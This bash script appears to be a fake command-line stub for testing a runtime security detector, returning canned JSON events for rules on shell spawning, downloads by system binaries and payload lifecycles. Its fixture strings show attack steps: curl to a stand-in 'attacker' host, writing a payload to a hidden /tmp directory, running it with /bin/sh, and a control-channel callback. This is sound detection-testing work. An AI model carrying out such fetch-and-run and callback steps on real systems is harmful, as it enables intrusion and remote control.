#!/usr/bin/env bash
set -euo pipefail

args="$*"
marker="${FAKE_MARKER:-marker-1}"
case_name="${FAKE_CASE:-ok}"

if [[ "$args" == *"agent health"* ]]; then
  printf '%s\n' '{"status":"ok","scope":{"type":"namespace","selector":"self"},"capability":{"backend":"tetragon"},"sensor":{"running":true,"policyLoaded":true}}'
  exit 0
fi

if [[ "$args" == *"event watch"* ]]; then
  if [[ "$case_name" == "external-marker" ]]; then
    printf '{"event":{"behavior":"process.exec","subjectProc":{"argv":["%s"]}}}\n' "$marker"
  fi
  exit 0
fi

rule=""
previous=""
for arg in "$@"; do
  if [[ "$previous" == "--rule-id" ]]; then
    rule="$arg"
    break
  fi
  previous="$arg"
done

severity="high"
missing='null'
events='[]'
case "$rule" in
  web_runtime_spawns_shell)
    events="[{\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"$marker\"]}}}]"
    ;;
  download_by_lolbin)
    severity="medium"
    events="[{\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8080/file?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8080\"}}}]"
    ;;
  payload_lifecycle)
    events="[\
      {\"event\":{\"behavior\":\"file.write\",\"subjectProc\":{\"argv\":[\"curl\",\"-o\",\"/tmp/.sysarmor-attack/$marker\"]},\"object\":{\"filePath\":\"/tmp/.sysarmor-attack/$marker\"}}},\
      {\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"/tmp/.sysarmor-attack/$marker\"]}}},\
      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8080/payload?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8080\"}}},\
      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8443/control?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}\
    ]"
    ;;
esac

case "$case_name" in
  wrong-severity) severity="low" ;;
  missing-ref) missing='["event-missing"]' ;;
  missing-behavior) events="$(printf '%s' "$events" | jq -c '[.[] | select(.event.behavior != "file.write")]')" ;;
  wrong-port) events="$(printf '%s' "$events" | sed 's/:8080/:80/g')" ;;
esac

jq -cn --arg rule "$rule" --arg severity "$severity" --argjson missing "$missing" --argjson events "$events" \
  '{eventFrames:$events,missingEventRefs:$missing,signalFrame:{signal:{ruleId:$rule,severity:$severity}}}'
